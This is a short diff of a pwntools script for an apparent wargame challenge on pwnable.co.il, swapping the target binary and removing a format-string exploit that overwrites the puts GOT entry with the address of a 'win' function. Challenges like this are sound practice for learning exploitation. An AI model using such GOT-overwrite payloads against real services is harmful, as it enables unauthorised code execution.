@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
-exe = context.binary = ELF('./theater')
+exe = context.binary = ELF('./professor')
 
 host = args.HOST or 'pwnable.co.il'
 port = int(args.PORT or 9011)
@@ -37,12 +37,6 @@ continue
 
 io = start()
 
-win = exe.sym['win']
-print(win)
-puts_got = exe.got['puts']
-print(puts_got)
-
-io.sendline(fmtstr_payload(6, {puts_got: win}))
 
 
 io.interactive()
